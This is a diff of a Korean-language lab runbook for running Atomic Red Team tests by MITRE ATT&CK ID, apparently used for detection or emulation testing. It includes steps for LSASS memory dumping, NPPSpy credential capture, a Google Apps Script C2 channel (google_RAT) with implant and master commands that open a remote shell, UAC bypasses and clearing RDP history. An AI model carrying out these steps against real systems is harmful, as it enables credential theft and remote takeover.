@@ -5,38 +5,53 @@
 # T1003 - OS Credential Dumping
 # Atomic Test 2 - Credential Dumping with NPPSpy
 #------------------------------------------------------------
-
 Step 1. invoke-atomictest T1003 -testnumber 2 -GetPrereqs -ExecutionLogPath $ExecutionLogPath 실행
 Step 2. invoke-atomictest T1003 -testnumber 2 -ExecutionLogPath $ExecutionLogPath 실행
 Step 3. Step2 진행 후 로그아웃 해야지 파일이 생성됨. (Windows lock으로는 안됨). 
 Step 4. invoke-atomictest T1003 -testnumber 2 -Cleanup -ExecutionLogPath $ExecutionLogPath 실행
 
-
 #------------------------------------------------------------
 # T1003.001 - OS Credential Dumping: LSASS Memory
 # Atomic Test 5 - Dump LSASS.exe Memory using Windows Task Manager
 #------------------------------------------------------------
+Step 1. task manager(작업관리자) 실행
+Step 2. "Details" 탭에서 lsass.exe 선택
+Step 3. 우 클릭 후 "create dump file"
 
 #------------------------------------------------------------
-# T1027 - Obfuscated Files or Information
-# Atomic Test #7 - Obfuscated Command in PowerShell
+# T1102.002A - Web Service: Bidirectional Communication
+# Atomic Test #1 - C2 using Google Apps Script - google_RAT
 #------------------------------------------------------------
+[Client PC - Windows10]
+Step 1. Open "cmd.exe"
+Step 2. cd <inplant.py 위치>
+Step 3. python test.py -k test https://script.google.com/macros/s/AKfycbzVbXkfOAJTmzxSUDeeuyYW-RJ6CMrFzF8bWtXObtSQWMmzINoXgi2isks5S2m6q6X7kw/exec
+
+[Attacker's Server - Kali]
+Step 1. cd /home/kali/바탕화면/google_RAT-master
+Step 2. python3 master.py -k test https://script.google.com/macros/s/AKfycbzVbXkfOAJTmzxSUDeeuyYW-RJ6CMrFzF8bWtXObtSQWMmzINoXgi2isks5S2m6q6X7kw/exec
+Step 3. lsc         # UUID 확인
+Step 4. shell <uuid>   # Step 3에서 확인한 UUID 입력
 
 #------------------------------------------------------------
 # T1112 - Modify Registry
 # Atomic Test #41 - Terminal Server Client Connection History Cleared
 #------------------------------------------------------------
-Step 1. "Windows 10 PC(192.168.1.10)" -> "Windows Server 2019(192.168.1.100)" RDP 접근 
+Step 1. "Windows 10 PC(192.168.1.10)" -> "Windows Server 2019(192.168.1.100)" RDP 로그온 
 Step 2. invoke-atomictest T1112 -testnumber 41 -ExecutionLogPath $ExecutionLogPath # 관리자 권한
 Step 3. invoke-atomictest T1112 -testnumber 41 -Cleanup -ExecutionLogPath $ExecutionLogPath  # 관리자 권한
 
+#------------------------------------------------------------
+# T1218 - Signed Binary Proxy Execution
+# Atomic Test #4 - ProtocolHandler.exe Downloaded a Suspicious File
+#------------------------------------------------------------
+Step 1. invoke-atomictest T1218 -testnumber 4 -ExecutionLogPath $ExecutionLogPath  # 성공적으로 실행되면, Microsoft Office 관련 Alert창이 나타남.
+Step 2. Alert 창에서 "yes"를 클릭  # 성공적으로 실행되면 MS Word가 실행되며 빈 페이지가 나타남.
 
 #------------------------------------------------------------
 T1548.002 - Abuse Elevation Control Mechanism: Bypass User Access Control
 #------------------------------------------------------------
-
 # Atomic Test #9 - Bypass UAC using SilentCleanup task
-
 Step 1. invoke-atomictest t1548.002 -testnumber 9 -ExecutionLogPath $ExecutionLogPath # 성공적으로 실행되면, 실행 중이던 Powershell 터미널은 종료되고 Administrator 권한의 Powershell 터미널이 생성됨
 
 # Atomic Test #11 - UACME Bypass Method 31
@@ -71,7 +86,6 @@ Step 2. invoke-atomictest t1548.002 -testnumber 16 -ExecutionLogPath $ExecutionL
 # Atomic Test #17 - UACME Bypass Method 61
 Step 1. invoke-atomictest t1548.002 -testnumber 17 -GetPrereqs -ExecutionLogPath $ExecutionLogPath
 Step 2. invoke-atomictest t1548.002 -testnumber 17 -ExecutionLogPath $ExecutionLogPath
-
 
 #------------------------------------------------------------
 T1005A - Data from Local System
